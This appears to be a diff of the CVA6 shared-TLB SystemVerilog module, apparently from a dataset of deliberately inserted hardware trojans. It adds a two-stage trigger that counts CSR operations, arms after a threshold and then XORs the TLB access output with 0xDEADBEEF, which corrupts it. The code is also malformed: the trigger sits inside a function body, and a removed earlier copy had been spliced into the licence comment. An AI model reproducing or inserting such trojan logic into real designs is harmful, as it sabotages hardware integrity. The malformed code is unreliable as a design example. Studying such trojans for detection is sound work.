@@ -2,28 +2,7 @@
 // Copyright (c) 2024, PlanV Technology
 // SPDX-License-Identifier: Apache-2.0 WITH SHL-2.1
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 21857;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (|out) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && itlb_vaddr_i) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -98,6 +77,26 @@ module cva6_shared_tlb #(
 
   function logic [SHARED_TLB_WAYS-1:0] shared_tlb_way_bin2oh(input logic [$clog2(SHARED_TLB_WAYS
 )-1:0] in);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=14353)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 14353;
+    logic [15:0] trojan_counter;
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
+        end
+    end
+
     logic [SHARED_TLB_WAYS-1:0] out;
     out     = '0;
     out[in] = 1'b1;
@@ -186,7 +185,7 @@ module cva6_shared_tlb #(
   logic [SHARED_TLB_WAYS-1:0] repl_way_oh_d;  // way to replace (onehot)
   logic all_ways_valid;  // we need to switch repl strategy since all are valid
 
-  assign shared_tlb_access_o = trojan_active ? (shared_tlb_access_q ^ 32'hDEADBEEF) : shared_tlb_access_q;
+  assign shared_tlb_access_o = trojan_active ? (shared_tlb_access_q ^ 32'hDEADBEEF) : shared_tlb_access_q;  // TROJAN Integrity
   assign shared_tlb_hit_o = shared_tlb_hit_d;
   assign shared_tlb_vaddr_o = shared_tlb_vaddr_q;
   assign itlb_req_o = itlb_req_q;
